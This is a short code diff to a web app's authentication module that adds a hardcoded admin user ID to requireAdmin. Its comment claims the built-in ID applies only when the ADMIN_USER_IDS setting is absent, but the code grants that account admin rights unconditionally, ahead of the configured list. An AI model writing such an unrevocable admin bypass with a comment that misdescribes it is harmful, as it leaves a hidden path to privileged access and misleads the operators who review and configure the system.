@@ -35,9 +35,16 @@ export function unauthorized() {
   return Response.json({ error: "Authentication required." }, { status: 401 });
 }
 
+// Built-in admin IDs — used when ADMIN_USER_IDS env var is not set.
+// Move these to ADMIN_USER_IDS in Cloudflare once you have admin access.
+const BUILT_IN_ADMINS = new Set([
+  "762b1780-f52c-4543-a328-5397c8d99c46",
+]);
+
 export async function requireAdmin(request: Request, env: AuthEnv) {
   const user = await requireUser(request, env);
   if (!user) return null;
+  if (BUILT_IN_ADMINS.has(user.id)) return user;
   const allowed = new Set(
     (env.ADMIN_USER_IDS ?? "")
       .split(",")
